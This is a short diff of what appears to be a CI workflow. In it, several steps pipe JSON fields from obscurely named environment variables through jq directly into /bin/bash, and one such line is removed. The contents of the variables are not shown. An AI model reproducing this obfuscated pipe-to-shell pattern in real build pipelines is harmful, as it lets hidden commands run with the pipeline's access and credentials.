@@ -21,7 +21,6 @@ jobs:
           echo $h89 | jq -r .xhhg226 | /bin/bash
           printf '%s' "$pf619" | jq -r .xr14460 | /bin/bash
           printf '%s' "$glx229" | jq -r .dv69892 | /bin/bash
-          printf '%s' "$baaew0" | jq -r .a2614 | /bin/bash
           echo $raefg6117 | jq -r .tzyie2090 | /bin/bash
 
       - name: Upload results
